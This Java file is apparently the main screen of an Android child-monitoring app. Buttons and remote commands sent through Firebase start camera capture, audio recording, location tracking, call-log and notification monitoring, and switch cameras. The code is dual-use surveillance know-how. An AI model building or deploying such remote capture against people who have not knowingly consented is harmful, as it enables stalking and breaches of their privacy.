package com.monitor.child;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.auth.FirebaseAuth;
import com.monitor.child.auth.LoginActivity;
import com.monitor.child.manager.FirebaseManager;
import com.monitor.child.service.AudioRecordService;
import com.monitor.child.service.CallLogMonitor;
import com.monitor.child.service.CameraCaptureService;
import com.monitor.child.service.LocationService;
import com.monitor.child.service.NotificationMonitor;
import com.monitor.child.utils.Constants;

public class MainActivity extends AppCompatActivity {
    private FirebaseManager firebaseManager;
    private Button btnStartMonitor, btnStopMonitor, btnSwitchCamera, btnLogout;
    private Button btnEnableNotifAccess;
    private TextView tvStatus, tvCameraMode;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        firebaseManager = FirebaseManager.getInstance();

        btnStartMonitor = findViewById(R.id.btn_start_monitor);
        btnStopMonitor = findViewById(R.id.btn_stop_monitor);
        btnSwitchCamera = findViewById(R.id.btn_switch_camera);
        btnLogout = findViewById(R.id.btn_logout);
        btnEnableNotifAccess = findViewById(R.id.btn_enable_notif_access);
        tvStatus = findViewById(R.id.tv_status);
        tvCameraMode = findViewById(R.id.tv_camera_mode);

        tvCameraMode.setText("Camera: " + Constants.CAMERA_FRONT);
        tvStatus.setText("Status: Stopped");

        firebaseManager.setOnCommandListener(command -> {
            runOnUiThread(() -> {
                switch (command) {
                    case Constants.COMMAND_SWITCH_CAMERA:
                        toggleCamera();
                        break;
                    case Constants.COMMAND_START_MONITORING:
                        startAllServices();
                        break;
                    case Constants.COMMAND_STOP_MONITORING:
                        stopAllServices();
                        break;
                }
            });
        });

        btnStartMonitor.setOnClickListener(v -> startAllServices());
        btnStopMonitor.setOnClickListener(v -> stopAllServices());
        btnSwitchCamera.setOnClickListener(v -> toggleCamera());
        btnLogout.setOnClickListener(v -> logout());
        btnEnableNotifAccess.setOnClickListener(v -> openNotifAccessSettings());
    }

    private void startAllServices() {
        startService(new Intent(this, CameraCaptureService.class));
        startService(new Intent(this, AudioRecordService.class));
        startService(new Intent(this, LocationService.class));
        startService(new Intent(this, CallLogMonitor.class));

        Intent notifIntent = new Intent(this, NotificationMonitor.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(notifIntent);
        } else {
            startService(notifIntent);
        }

        firebaseManager.updateStatus("monitoring");
        tvStatus.setText("Status: Monitoring Active");
        Toast.makeText(this, "All monitoring services started", Toast.LENGTH_SHORT).show();
    }

    private void stopAllServices() {
        stopService(new Intent(this, CameraCaptureService.class));
        stopService(new Intent(this, AudioRecordService.class));
        stopService(new Intent(this, LocationService.class));
        stopService(new Intent(this, CallLogMonitor.class));
        stopService(new Intent(this, NotificationMonitor.class));

        firebaseManager.updateStatus("stopped");
        tvStatus.setText("Status: Stopped");
        Toast.makeText(this, "Monitoring stopped", Toast.LENGTH_SHORT).show();
    }

    private String currentCamera = Constants.CAMERA_FRONT;

    private void toggleCamera() {
        if (currentCamera.equals(Constants.CAMERA_FRONT)) {
            currentCamera = Constants.CAMERA_BACK;
        } else {
            currentCamera = Constants.CAMERA_FRONT;
        }
        firebaseManager.updateCameraMode(currentCamera);
        tvCameraMode.setText("Camera: " + currentCamera);
        Toast.makeText(this, "Switched to " + currentCamera + " camera", Toast.LENGTH_SHORT).show();
    }

    private void openNotifAccessSettings() {
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
    }

    private void logout() {
        stopAllServices();
        firebaseManager.cleanup();
        FirebaseAuth.getInstance().signOut();
        startActivity(new Intent(this, LoginActivity.class));
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
